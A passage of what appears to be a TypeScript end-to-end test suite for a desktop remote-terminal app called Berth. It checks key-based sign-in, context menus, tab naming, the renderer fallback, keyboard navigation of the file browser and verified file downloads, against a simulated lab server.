          const reallyIn = [...ctx.tabs.values()].some((t) => t.box?.id === idA && t.engine.link.phase === 'up');
          check('it says it worked only after signing back in with the key alone, and the tab is really up', said && reallyIn, [said, reallyIn]);
          // Answers to a box's own questions are taken only while a sign-in is waiting for them. Nothing is
          // asking now, so these are dropped and counted: a view that has been taken over cannot hand an
          // answer to a sign-in that did not ask, nor to a box that is not the one on the screen.
          {
            const droppedBefore = ctx.dropped();
            await js(ctx.shell, `window.shellPort.cmd({ op: 'firstVisitAnswers', box: ${JSON.stringify(idA)}, answers: ['123456'] })`);
            await js(ctx.shell, `window.shellPort.cmd({ op: 'firstVisitAnswers', box: 'bno-such-box', answers: ['123456'] })`);
            await sleep(300);
            refusedByTheLock += 2;
            check('answers to questions nothing asked are dropped and counted', ctx.dropped() === droppedBefore + 2, ctx.dropped() - droppedBefore);
          }
          await clickOn('#first-visit-close');
          // Once, whatever happens: a second visit to the same box is refused.
          await js(ctx.shell, `window.shellPort.cmd({ op: 'firstVisit', box: ${JSON.stringify(idA)} })`);
          await sleep(400);
          check('a box is visited once: asking again does nothing', !(await has('#first-visit')) && visits.length === 1 && (await text('#status')).includes('already been visited'), [await has('#first-visit'), visits.length]);
          for (const t of [...ctx.tabs.values()].filter((t) => t.box?.id === idA)) ctx.closeTab(t.id);

          // And when the key does not work, it says so rather than claiming it worked. The lab says the visit
          // went fine; the box is never told to accept this second box's key, so the sign-in that follows must
          // fail and the screen must say that.
          const idB = await add('second-visit-box');
          await clickOn('#check-paste');
          await selectAll();
          await typeKeys(printed.trim());
          await until(() => has('#check-visit'), 10_000);
          await clickOn('#check-visit');
          await until(() => has('#first-visit'), 15_000);
          await clickOn('#first-visit-password');
          await typeKeys('another-password');
          await clickOn('#first-visit-go');
          const failed = await until(() => has('#first-visit-failed'), 60_000);
          const why = await text('#first-visit-failed');
          check('a visit whose key does not work says so, and does not claim it worked', failed && !(await has('#first-visit-done')) && why.includes('signing in with it did not work'), [failed, why]);
          await clickOn('#first-visit-close');
          // A box the lab refuses is left behind as it is: the tabs it opened are closed and the box removed,
          // so the rest of the suite sees the world it expects.
          for (const t of [...ctx.tabs.values()].filter((t) => t.box?.id === idB)) ctx.closeTab(t.id);
          ctx.watchFirstVisits(null);
          for (const b of ctx.boxes.list.filter((x) => x.name === 'first-visit-box' || x.name === 'second-visit-box')) await ctx.boxes.remove(b.id);
          await lab.tell(`accept ${ctx.boxes.list.find((b) => b.name === 'lab-box')?.publicKey ?? ''}`);
          answer = { ok: true, said: '' };
        }

        // The Boxes menu: the box, its place beside it; a place opens a tab there.
        await clickOn('#boxes');
        check('Boxes opens the menu, above the tabs', (await until(() => has('#box-menu'), 2000)) && (await until(shellOnTop, 1000)) && (await text('#box-menu')).includes('lab-box'), '');
        // Nothing a person is pointing at may move under them. Edit and Delete appear on the row when it is
        // hovered, and their room has to be there before that: taken out of the row and put back, they made the
        // row grow and pushed the box's name into wrapping (the owner, 2026-11-17).
        const rowBox = () => js<{ h: number; nameW: number; rowW: number }>(ctx.shell, `(() => { const r = document.querySelector('[data-box="lab-box"]'); const n = r.querySelector('.bm-name'); return { h: Math.round(r.getBoundingClientRect().height), nameW: Math.round(n.getBoundingClientRect().width), rowW: Math.round(r.getBoundingClientRect().width) }; })()`);
        const before = await rowBox();
        await moveTo('[data-box="lab-box"]');
        check('its places open beside it', await until(() => has('[data-place="logs"]'), 2000), '');
        const after = await rowBox();
        const actsShown = await js<boolean>(ctx.shell, `(() => { const a = document.querySelector('[data-box="lab-box"] .bm-acts'); return a !== null && getComputedStyle(a).opacity === '1'; })()`);
        check('hovering a box row shows Edit and Delete without the row moving under the hand', actsShown && after.h === before.h && after.nameW === before.nameW && after.rowW === before.rowW, [before, after, actsShown]);
        await shot('boxes-menu', 'the Boxes menu, a box\'s places open');
        // The right button on a box. His walkthrough of 2026-11-15 put Connect, Edit, Duplicate and Delete
        // here and none of it was ever built; Edit and Delete have been on the row as buttons since, because
        // nothing in this app hides behind a right press, so the menu is the second way to those and the
        // only way to the other two. Held on what it offers, on what it must not do, and on the one thing a
        // menu drawn by the window can get wrong: leaving the window above its own tabs when it goes.
        {
          const boxRow = async (): Promise<string[]> => {
            await js(ctx.shell, `(() => { const e = document.querySelector('#box-menu [data-box]'); const r = e.getBoundingClientRect(); e.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, cancelable: true, clientX: Math.round(r.left + 10), clientY: Math.round(r.top + 6) })); })()`);
            await sleep(180);
            return js<string[]>(ctx.shell, `[...document.querySelectorAll('#shell-menus .fb-menu-one .fb-menu-words')].map((w) => w.textContent)`);
          };
          const onBox = await boxRow();
          await sweepMenu(ctx.shell, 'the Boxes menu, on a box');
          await shot('box-menu', 'the right button on a box in the Boxes menu', null);
          check(`the right button on a box offers what can be done to it: ${onBox.join(', ')}`,
            onBox.includes('Open it in a new tab') && onBox.includes('Edit it') && onBox.includes('Make another from it') && onBox.includes('Delete it'),
            onBox);
          // Nothing in it reaches a shell, and nothing in it does the thing it names without asking: Delete
          // opens the asking that names what goes, which is the dialog this app has had since #59.
          check('and nothing in it types into his shell', !onBox.some((w) => /terminal|shell|run |command/i.test(w)), onBox);
          await js(ctx.shell, `document.querySelector('#shell-menus .fb-menu')?.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }))`);
          await until(() => !ctx.overlayOn(), 3000);
          // Make another from it: the same dialog as Add box, with what two boxes on one machine share
          // already in it, a name that is free, and nothing of the other box's key or pinned identity.
          const again = await boxRow();
          check('the menu can be opened a second time on the same box', again.includes('Make another from it'), again);
          await js(ctx.shell, `document.getElementById('box-menu-duplicate')?.click()`);
          const opened = await until(() => has('#add-box'), 5000);
          const seeded = await js<{ name: string; host: string; user: string; pinned: boolean; title: string }>(ctx.shell, `(() => {
            const v = (id) => document.getElementById(id)?.value ?? '';
            return { name: v('box-name'), host: v('box-host'), user: v('box-user'), pinned: !!document.getElementById('edit-pinned'), title: document.getElementById('add-title')?.textContent ?? '' };
          })()`);
          check('Make another from it opens Add box carrying where it is and who signs in, under a name that is free, and nothing of the other box\u2019s identity',
            opened && seeded.title.includes('Add box') && seeded.name !== '' && seeded.name !== 'lab-box' && seeded.host !== '' && seeded.user !== '' && !seeded.pinned,
            [opened, seeded]);
          await clickOn('#add-cancel');
          await until(async () => !(await has('#add-box')), 5000);
          // Waited for rather than read the instant the dialog leaves the page: what the window is drawn
          // above is main's to decide, and the page saying the dialog is gone travels there before it is
          // acted on. If nothing ever puts it back this waits its whole time and fails, which is the point.
          const backDown = await until(() => !ctx.overlayOn(), 3000);
          const why = await js<{ dialog: boolean; boxes: boolean; menus: number; scrim: boolean }>(ctx.shell, `({
            dialog: !!document.querySelector('.dialog'),
            boxes: !!document.getElementById('box-menu'),
            menus: document.querySelectorAll('#shell-menus .fb-menu').length,
            scrim: !!document.querySelector('.scrim'),
          })`);
          check('and the window is put back behind its tabs after all of that', backDown, why);
          await js(ctx.shell, `document.getElementById('boxes')?.click()`);
          await until(() => has('#box-menu'), 5000);
          await js(ctx.shell, `document.querySelector('#box-menu [data-box]')?.dispatchEvent(new PointerEvent('pointerenter', { bubbles: true }))`);
          await sleep(160);
        }
        await clickOn('[data-place="logs"]');
        const t2ok = await until(() => [...ctx.tabs.values()].some((t) => t.place === 'logs' && t.engine.link.phase === 'up'), 20_000);
        check('a place opens a tab there, signed in; the menu is gone and the tab is above the shell', t2ok && !(await has('#box-menu')) && !shellOnTop(), [...ctx.tabs.values()].map((t) => t.engine.link.phase));
        // Where the shell's own rows end, and where main puts a tab's view, are two numbers in two processes
        // that have to agree. They did not the moment the window gained its nav row: main placed every tab at
        // 46px, the shell drew 70px of rows above it, and the panes were drawn underneath their own tab strip
        // with their heads cut off. Nothing in the build said a word, because each side was right on its own.
        {
          const below = await js<number>(ctx.shell, `Math.round(document.getElementById('bar').getBoundingClientRect().bottom)`);
          const front = [...ctx.tabs.values()][0]!;
          const at = front.view.getBounds();
          check('a tab\'s view begins exactly where the shell\'s rows above it end, in both processes',
            below === at.y, { shellSaysRowsEndAt: below, mainPutsTheTabAt: at.y });
        }
        check('the tab says its box and its place, in the box\'s colour', (await text('[data-tab]')).includes('lab-box') && (await text('[data-tab]')).includes('logs') && (await text('#status')).includes('lab-box, logs'), await text('#status'));
        // The status line shows rather than talks (his #17). It used to be one phrase to read left to right,
        // "round trip 0 ms, post-quantum", where what a status line is for is a glance. Each fact is its own
        // field now: a glyph, a short value, and the colour its meaning carries. The claim is held on all
        // three at once, because a field with no glyph or with every field the same colour is a sentence
        // again with gaps in it.
        interface Field { id: string; words: number; text: string; colour: string; glyph: string }
        const fields = (): Promise<Field[]> => js(ctx.shell, `[...document.querySelectorAll('#status .s-f')].map((e) => {
          const g = e.querySelector('.glyph');
          return { id: e.id, words: (e.textContent || '').trim().split(/\\s+/).filter(Boolean).length, text: (e.textContent || '').trim(), colour: getComputedStyle(e).color, glyph: g ? getComputedStyle(g).color : 'none' };
        })`);
        {
          const f = await fields();
          const rtt = f.find((x) => x.id === 'status-rtt');
          const pq = f.find((x) => x.id === 'status-pq');
          check('the status line is fields, not a sentence: each a glyph, a value of at most three words, and its own colour',
            f.length >= 2 && f.every((x) => x.words > 0 && x.words <= 3 && x.glyph !== 'none' && x.glyph === x.colour)
            && !!rtt && /^\d+ ms$/.test(rtt.text) && !!pq && pq.text === 'post-quantum' && pq.colour !== rtt.colour,
            f);
        }
        // The right button on the tab strip. The menu component moved out of the pane to src/ui/menu.ts so
        // that the window itself could use the same one: a menu per surface would be the same mistake as the
        // panes themselves were. Held on both halves, and on the thing a shared component makes possible to
        // get wrong: the window has to be drawn above its tabs while a menu is open, and put back when it
        // goes, or the next menu opens behind the tab it is about.
        {
          const strip = async (what: string): Promise<string[]> => {
            await js(ctx.shell, `(() => { const e = ${what}; const r = e.getBoundingClientRect(); e.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, cancelable: true, clientX: Math.round(r.left + 6), clientY: Math.round(r.top + 6) })); })()`);
            await sleep(180);
            return js<string[]>(ctx.shell, `[...document.querySelectorAll('#shell-menus .fb-menu-one .fb-menu-words')].map((w) => w.textContent)`);
          };
          const shutIt = (): Promise<unknown> => js(ctx.shell, `document.querySelector('#shell-menus .fb-menu')?.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }))`);
          const onTab = await strip(`document.querySelector('[data-tab]')`);
          await sweepMenu(ctx.shell, 'the tab strip, on a tab');
          await shot('tab-menu', 'the right button on a tab, drawn by the one menu the whole window shares', null);
          const aboveWhileOpen = ctx.overlayOn();
          // The lines about the tabs beside this one are there only when there are tabs beside it: a menu
          // never shows a thing that cannot be used (BUILD-RULES 2.8), so the claim is held against how many
          // tabs are really open rather than against a number written here.
          const openTabs = ctx.shellState().tabs.length;
          const besides = openTabs > 1 ? onTab.some((w) => w.startsWith('Close the other')) : !onTab.some((w) => w.startsWith('Close the other'));
          check(`the right button on a tab offers what can be done to it and the ones beside it (${openTabs} open): ${onTab.join(', ')}`,
            onTab.includes('Close this tab') && besides && onTab.some((w) => w.startsWith('Edit ')) && aboveWhileOpen,
            [onTab, openTabs, aboveWhileOpen]);
          // Naming a tab was his to decide and he decided it on the night of 2026-11-18, so the line is
          // there now. What is still not in it is what nobody decided: duplicating a tab, which is undecided
          // for a place that keeps running, and reopening the last closed one, which needs state nothing
          // keeps. A line invented for either would be a line that means nothing in this app.
          check('and it offers what he decided, and nothing invented: naming this tab, no duplicate, no reopen', onTab.some((w) => /^Name this tab$|^Rename /.test(w)) && !onTab.some((w) => /duplicate|reopen/i.test(w)), onTab);
          await shutIt();
          await sleep(120);
          check('and the window is put back behind its tabs when the menu goes', await until(() => !ctx.overlayOn(), 3000), '');
          // ---- A tab's own name and colour ----
          //
          // His, the night of 2026-11-18. Most tabs are left as what they are, one box and one place; this
          // is for the two or three that are not. The group's edge and its dot keep the box's own colour
          // whatever a tab is called, because a tab is his to name and a box is what it is.
          {
            const id = ctx.shellState().tabs[0]?.id ?? 0;
            await js(ctx.shell, `window.shellPort.cmd({ op: 'nameTab', id: ${id}, name: 'the deploy I am watching', colour: 2 })`);
            const wears = await until(async () => (await js<string>(ctx.shell, `document.querySelector('[data-tab="${id}"] .tab-own')?.textContent ?? ''`)) === 'the deploy I am watching', 5000);
            const dotKeeps = await js<boolean>(ctx.shell, `(() => {
              const tab = document.querySelector('[data-tab="${id}"]');
              const own = tab?.querySelector('.tab-own');
              const dot = tab?.querySelector('.box-dot') ?? tab?.querySelector('[class*="mark"]');
              if (!own) return false;
              const mine = getComputedStyle(own).getPropertyValue('--hue').trim();
              const box = getComputedStyle(tab).getPropertyValue('--hue').trim();
              return mine !== '' && mine !== box;
            })()`);
            check('a tab he names wears that name, in a colour of its own, while the box keeps its own', wears && dotKeeps, [wears, dotKeeps]);
            // And it is written into his own locked list with the tabs the morning offers, so a tab he named
            // is still that tab after a restart. What is held is what was saved, because the morning reads
            // exactly this.
            const saved = await until(() => ctx.lastTabsNow().some((t) => t.own === 'the deploy I am watching' && t.ownColour === 2), 15_000);
            check('and what he called it is saved with the tabs the morning offers to open again', saved, ctx.lastTabsNow());
            // Empty puts it back to what it is, which is the ordinary case and must be one press away.
            await js(ctx.shell, `window.shellPort.cmd({ op: 'nameTab', id: ${id}, name: '', colour: 0 })`);
            const back = await until(async () => (await js<number>(ctx.shell, `document.querySelectorAll('[data-tab="${id}"] .tab-own').length`)) === 0, 5000);
            check('and an empty name puts the tab back to its box and its place', back, back);
          }
          const onStrip = await strip(`document.getElementById('bar')`);
          await sweepMenu(ctx.shell, 'the tab strip, empty part');
          check(`the right button on the empty part of the strip is about the strip: ${onStrip.join(', ')}`,
            onStrip.includes('Open a box') && onStrip.includes('Settings') && !onStrip.includes('Close this tab'), onStrip);
          await shutIt();
          await sleep(120);
        }
        // The terminal is framed in its box's colour too. The tabs carry it already; the thing a person types
        // into did not, so with two boxes open there was nothing in the terminal itself to say which it was.
        {
          const front = [...ctx.tabs.values()].find((t) => t.place === 'logs')!;
          const hue = () => js<string>(front.view, `getComputedStyle(document.documentElement).getPropertyValue('--hue').trim()`);
          const shadow = () => js<string>(front.view, `getComputedStyle(document.getElementById('term')).boxShadow`);
          const live = () => js<string>(front.view, `document.documentElement.dataset.live ?? ''`);
          // The browser gives a custom property back worked out, so --hue reads as the colour itself, not as the
          // name it was set from: it is compared with that box's colour, worked out the same way.
          const itsColour = await js<string>(front.view, `getComputedStyle(document.documentElement).getPropertyValue('--box-${front.box!.colour}').trim()`);
          const framed = await until(async () => (await hue()) === itsColour && itsColour !== '', 4000);
          // The box's colour is mixed into the frame, so the frame is not the one a tab with no box wears. The
          // two are compared as the browser works them out, not as they are written.
          const wearing = await shadow();
          const plainFrame = await js<string>(front.view, `(() => { const d = document.createElement('div'); d.style.boxShadow = 'inset 0 0 0 1px var(--line)'; document.body.appendChild(d); const v = getComputedStyle(d).boxShadow; d.remove(); return v; })()`);
          check('the terminal is framed in its box\'s own colour, not the plain line colour', framed && (await live()) === 'yes' && wearing !== plainFrame, [await hue(), wearing.slice(0, 70), plainFrame.slice(0, 70)]);
          // ---- Which renderer is drawing, and what happens when it goes ----
          //
          // The plain renderer ignores a colour set on a decoration, so the prompt's own letters can only be
          // coloured by the WebGL one (his, 2026-11-18 night, after this chat proposed rewriting the bytes a
          // box sends and he refused it). Two things are held: that the window knows which of the two is
          // drawing, and that losing the graphics renderer leaves a terminal that still draws and says so.
          // The loss is a real one, asked for through the browser's own way of losing a context, not a flag
          // this app reads: a fallback proven by a switch of its own proves the switch.
          const renderer = (): Promise<string> => js<string>(front.view, `window.berthTerm?.drawnBy?.() ?? '(not there)'`);
          const drawing = await renderer();
          check(`the window knows which renderer is drawing its terminal: ${drawing}`, drawing === 'webgl' || drawing === 'plain', drawing);
          if (drawing === 'webgl') {
            const lost = await js<string>(front.view, `(() => {
              // A terminal has several canvases and only one of them is the graphics one: asking a canvas
              // that already holds a flat drawing context for a graphics context gives nothing back, so they
              // are all asked and the one that answers is the one to take the context from.
              const all = [...document.querySelectorAll('#term canvas')];
              if (all.length === 0) return 'no canvas';
              for (const c of all) {
                const gl = c.getContext('webgl2') ?? c.getContext('webgl');
                if (!gl) continue;
                const ext = gl.getExtension('WEBGL_lose_context');
                if (!ext) return 'cannot lose it';
                ext.loseContext();
                return 'lost';
              }
              return 'no context among ' + all.length;
            })()`);
            const fellBack = await until(async () => (await renderer()) === 'plain', 8000);
            const saidSo = await until(async () => (await js<string>(front.view, `(() => { const e = document.getElementById('term-drawn'); return e && !e.hidden ? (e.textContent ?? '') : ''; })()`)).includes('no graphics renderer'), 8000);
            const stillDraws = await js<boolean>(front.view, `!!document.querySelector('#term .xterm-screen')`);
            check('losing the graphics renderer leaves a terminal that still draws, and says what it lost', lost === 'lost' && fellBack && saidSo && stillDraws, [lost, fellBack, saidSo, stillDraws]);
          } else {
            // No graphics renderer on this machine at all: then the terminal must have said so by itself.
            const saidSo = await js<boolean>(front.view, `(() => { const e = document.getElementById('term-drawn'); return !!e && !e.hidden && (e.textContent ?? '').includes('no graphics renderer'); })()`);
            check('a machine with no graphics renderer is told so, rather than quietly losing the prompt\'s colour', saidSo, saidSo);
          }
          // And the window says which box it is on, for the taskbar: Berth draws its own title bar, so this is
          // the only place that name is read.
          check('the window names the box and place it is on', ctx.win.title.startsWith('lab-box') && ctx.win.title.includes('logs') && ctx.win.title.includes('Berth'), ctx.win.title);
        }
        // The tab's own file browser, on its own channel to the box: the folder is listed and drawn while the
        // terminal on the same link goes on working.
        {
          const front = [...ctx.tabs.values()].find((t) => t.place === 'logs')!;
          const listed = await until(async () => (await js<number>(front.view, `document.querySelectorAll('#fb-list .fb-row').length`)) > 0, 15_000);
          const names = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`);
          const kinds = await js<Record<string, string>>(front.view, `Object.fromEntries([...document.querySelectorAll('#fb-list .fb-row')].map((r) => [r.dataset.name, r.dataset.kind]))`);
          const path0 = await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`);
          check('the tab lists its box\'s own folder in its own file browser', listed && path0.endsWith('/var/log') && names.includes('syslog') && names.includes('ledger'), [path0, names.slice(0, 10)]);
          check('and each row says what it is', kinds['ledger'] === 'folder' && kinds['syslog'] === 'file', kinds);
          // Folders first, then names as a person reads them.
          const real = names.filter((n) => n !== '..');
          const folders = real.filter((n) => kinds[n] === 'folder');
          check('folders come first', real.slice(0, folders.length).every((n) => kinds[n] === 'folder'), real);
          const foot = await js<string>(front.view, `document.getElementById('fb-foot')?.textContent ?? ''`);
          check('the footer says how many things are there and what is left of the disk', /\d+ items/.test(foot) && foot.includes('free of'), foot);
          // Going into a folder lists it, and the way up comes back.
          await js(front.view, `document.querySelector('[data-name="ledger"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
          const wentIn = await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('today.log'), 10_000);
          const path1 = await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`);
          check('going into a folder lists that folder, and the path says where it is', wentIn && path1.endsWith('/var/log/ledger'), [path1, wentIn]);
          await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
          check('and the way up comes back to the folder above', await until(async () => (await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`)).endsWith('/var/log'), 10_000), await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`));
          // The list is reached by the keyboard as well as by a mouse (BUILD-RULES 2.16): one row carries the
          // tab stop so Tab lands on the list once, the arrows move inside it, and Enter does what a
          // double-click does.
          {
            const tap = async (keyCode: string, modifiers: ('control' | 'shift' | 'alt')[] = []): Promise<void> => {
              front.view.webContents.sendInputEvent({ type: 'keyDown', keyCode, modifiers });
              front.view.webContents.sendInputEvent({ type: 'keyUp', keyCode, modifiers });
              await sleep(120);
            };
            const standing = (): Promise<string> => js<string>(front.view, `document.querySelector('#fb-list .fb-row[tabindex="0"]')?.dataset.name ?? ''`);
            const focused = (): Promise<string> => js<string>(front.view, `document.activeElement?.dataset?.name ?? ''`);
            // The folder above was asked for again on the way up, and the path says where it is as soon as the
            // box names it, which is before any row of it has arrived: the list is waited for, so what is
            // read below is a list that is really on screen.
            const backWithRows = await until(async () => (await js<number>(front.view, `document.querySelectorAll('#fb-list .fb-row').length`)) > 1, 15_000);
            check('the folder above is on screen again, rows and all', backWithRows, backWithRows);
            // Read in one go, so the three say what the list was at one moment and not at three.
            const stop = await js<{ stops: number; first: string; standing: string }>(front.view, `(() => { const r = [...document.querySelectorAll('#fb-list .fb-row')]; return { stops: r.filter((e) => e.tabIndex === 0).length, first: r[0]?.dataset.name ?? '', standing: r.find((e) => e.tabIndex === 0)?.dataset.name ?? '' }; })()`);
            const firstName = stop.first;
            check('one row of the list carries the tab stop, so Tab reaches the list once', stop.stops === 1 && stop.standing === stop.first && stop.first !== '', stop);
            await js(front.view, `document.querySelector('#fb-list .fb-row[tabindex="0"]')?.focus()`);
            await tap('Down');
            const second = await standing();
            await tap('Down');
            const third = await standing();
            await tap('Up');
            check('the arrows move the place, and the row holding it is the one with the focus', second !== firstName && third !== second && (await standing()) === second && (await focused()) === second, [firstName, second, third, await focused()]);
            await tap('End');
            const atEnd = await standing();
            await tap('Home');
            check('Home and End reach the two ends of the list', atEnd !== firstName && (await standing()) === firstName, [atEnd, firstName, await standing()]);
            // Enter on a folder goes into it; Backspace comes back out. Nothing here needs a mouse.
            const standOn = async (name: string): Promise<boolean> => {
              const there = await until(async () => (await js<number>(front.view, `document.querySelectorAll('#fb-list .fb-row[data-name="${name}"]').length`)) === 1, 8000);
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="${name}"]')?.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }))`);
              await js(front.view, `document.querySelector('#fb-list .fb-row[tabindex="0"]')?.focus()`);
              await sleep(80);
              return there && (await standing()) === name;
            };
            const onLedger = await standOn('ledger');
            await tap('Return');
            const inFolder = await until(async () => (await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`)).endsWith('/var/log/ledger'), 10_000);
            await js(front.view, `document.querySelector('#fb-list .fb-row[tabindex="0"]')?.focus()`);
            await tap('Backspace');
            const backOut = await until(async () => (await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`)).endsWith('/var/log'), 10_000);
            check('Enter goes into a folder and Backspace comes back out, with no mouse anywhere in it', onLedger && inFolder && backOut, [onLedger, inFolder, backOut]);
            // A thing that is neither a file nor a folder opens nothing, and the press is answered rather than
            // swallowed: the foot says what the thing is.
            const onLink = await standOn('current');
            await tap('Return');
            await sleep(200);
            const footSaid = await js<string>(front.view, `document.getElementById('fb-foot')?.textContent ?? ''`);
            check('Enter on something that is neither a file nor a folder opens nothing and says what it is', onLink && footSaid.includes('current is a link') && (await js<string>(front.view, `document.querySelector('.fb-path')?.textContent ?? ''`)).endsWith('/var/log'), [onLink, footSaid]);
            // Ctrl with a key is not the list's: it belongs to the window or to the box, and the place stays.
            const before = await standing();
            await tap('Down', ['control']);
            check('a press with Ctrl held is not the list\'s, and the place does not move', (await standing()) === before, [before, await standing()]);
            // And the window's own keys work from in here: the focus is on a file, which is where it is while
            // a file is being picked, and Ctrl+Tab still moves between tabs rather than being swallowed.
            {
              // A second tab for this one probe, so there is somewhere for the press to go, and it is closed
              // again straight after.
              const spare = ctx.openTab()!;
              await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${front.id} })`);
              await until(() => ctx.shellState().active === front.id, 3000);
              ctx.win.focus();
              await until(() => ctx.win.isFocused(), 4000);
              // The list is drawn again whenever anything it says changes, and a row drawn again is a new row
              // that holds no focus. So the focus is asked for until it sticks, rather than asked for once and
              // read a moment later: otherwise this probe is about what the pane happened to be doing.
              const onAFile = await until(async () => js<boolean>(front.view, `(document.querySelector('#fb-list .fb-row[tabindex="0"]')?.focus(), document.activeElement?.classList.contains('fb-row') === true)`), 4000);
              await tap('Tab', ['control']);
              const switched = await until(() => ctx.shellState().active === spare.id, 3000);
              const stayedPut = (await standing()) === before;
              ctx.closeTab(spare.id);
              await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${front.id} })`);
              await until(() => ctx.shellState().active === front.id, 3000);
              check('Ctrl+Tab works with the focus on a file in the list, and the place in the list does not move', onAFile && switched && stayedPut, [onAFile, switched, stayedPut]);
            }
          }
          // Bringing a file over to the PC. The view says which file on its own box and nothing else: where it
          // lands and what it is called there are main's (plan B2.7). What arrives must be the box's own bytes,
          // and the window must say so only when the box itself agrees.
          {
            const tap = async (keyCode: string, modifiers: ('control' | 'shift' | 'alt')[] = []): Promise<void> => {
              front.view.webContents.sendInputEvent({ type: 'keyDown', keyCode, modifiers });
              front.view.webContents.sendInputEvent({ type: 'keyUp', keyCode, modifiers });
              await sleep(120);
            };
            const foot = (): Promise<string> => js<string>(front.view, `(document.getElementById('fb-moving')?.textContent ?? '') + (document.getElementById('fb-foot')?.textContent ?? '')`);
            const standOn = async (name: string): Promise<boolean> => {
              const there = await until(async () => (await js<number>(front.view, `document.querySelectorAll('#fb-list .fb-row[data-name="${name}"]').length`)) === 1, 8000);
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="${name}"]')?.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }))`);
              await js(front.view, `document.querySelector('#fb-list .fb-row[tabindex="0"]')?.focus()`);
              await sleep(80);
              return there;
            };
            // Ctrl+S on a file brings it over. Nothing else a person did names a place on this PC.
            await standOn('syslog');
            await tap('S', ['control']);
            const arrived = await until(async () => (await foot()).includes('is in the download folder'), 25_000);
            const said = await foot();
            const landed = path.join(ctx.downloads, 'syslog');
            const bytes = await readFile(landed).catch(() => Buffer.alloc(0));
            // The box was asked for its own hash of that file, on a channel of its own, and nothing else ran.
            const ranOnTheBox = ((await lab.tell('seen'))['sessions'] as { Command?: string }[]).map((x) => x.Command ?? '').filter((c) => c !== '');
            check('Ctrl+S on a file brings it over, and the window says where it went and that the box agrees', arrived && said.includes('checked against the box') && bytes.toString() === "a line of the box's own log\n", [said, bytes.length, ranOnTheBox]);
            // The same file again: it lands beside the first one under a free name, and the first is untouched.
            await tap('S', ['control']);
            const again = await until(async () => (await foot()).includes('syslog (2)'), 25_000);
            const first = await readFile(landed).catch(() => Buffer.alloc(0));
            const second = await readFile(path.join(ctx.downloads, 'syslog (2)')).catch(() => Buffer.alloc(0));
            check('the same file again lands beside the first under a free name, and the first is untouched', again && first.toString() === second.toString() && first.length > 0, [await foot(), first.length, second.length]);
            // A name this PC cannot hold as it is: it lands under one it can, and the window says why.
            // This one needs a box whose filesystem is not this PC's, because the name has to be one the box
            // can hold and the PC cannot. On Windows the lab's box is a folder on this very machine, so no
            // such name can be made at all: there the rule is held by tests/landing.test.ts, name by name,
            // and by this probe on Linux.
            // A file is put back a year, for the column that says when a file was changed. Every file this lab
            // makes is made now, so without this the column holds only today's shape, and a column that dropped
            // the date entirely would read exactly the same. And that same file is answered for with no long
            // form, as some boxes really do, so the Owner column holds a name on every row but that one and a
            // bare number on it: the pair he sees on his own screen. It is syslog and not one of the odd-named
            // files because a Windows runner cannot hold those names at all, and these must hold on both.
            await lab.tell('aged var/log/syslog 400');
            await lab.tell('bare syslog');
            // A folder whose name says what is in it, so the picture a folder wears is proved as well as the
            // one a file wears: he named the folders first of the two.
            await lab.tell('bigfile var/log/scripts/one.sh 35');
            if (process.platform === 'win32') {
              check('a name this PC cannot hold: not provable here, because the lab\u2019s box is this PC', true, 'skipped on Windows: see tests/landing.test.ts');
              // The five odd names are most of what this folder holds, and the probes further down need
              // several rows to press, drag across and order. They need rows, not odd names, so here the lab
              // makes plain ones instead: without them a Windows runner reaches the choosing probes with four
              // rows and the one that takes a run between two of them presses a row that is not there.
              const stood = await Promise.all(['pick-one.txt', 'pick-two.txt', 'pick-three.txt'].map((n) => lab.tell(`bigfile var/log/${n} 35`)));
              check('the lab made plain files to choose among, in place of the names this PC cannot hold', stood.every((x) => x['bytes'] === 35), stood);
            } else {
            const odd = await lab.tell('oddnames var/log');
            check('the lab made files whose names a PC cannot hold', odd['made'] === 5, odd);
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('a:b.txt'), 10_000);
            await standOn('a:b.txt');
            await tap('S', ['control']);
            const renamed = await until(async () => (await foot()).includes('is in the download folder'), 25_000);
            const renamedSaid = await foot();
            const here = await readdir(ctx.downloads).catch(() => [] as string[]);
            check('a name this PC cannot hold lands under one it can, and the window says why', renamed && renamedSaid.includes('renamed') && here.includes('a_b.txt') && !here.some((n) => n.includes(':')), [renamedSaid, here]);
            }
            // A box that says a file is bigger than this disk can hold: nothing is written at all, and the
            // window says why. The check is made on what the box said, before a single byte is kept.
            // A file big enough that, were the room asked about while it was already arriving, it would still
            // be arriving when this probe looks: that is what makes the answer below about the order of things
            // and not about which of two races happened to win.
            const heavy = await lab.tell('bigfile var/log/heavy.log 4000000');
            check('the lab made a file big enough to catch a download that started before it should', heavy['bytes'] === 4000000, heavy);
            await lab.tell('filepace 40');
            const lying = await lab.tell('pretendsize heavy.log 900000000000000');
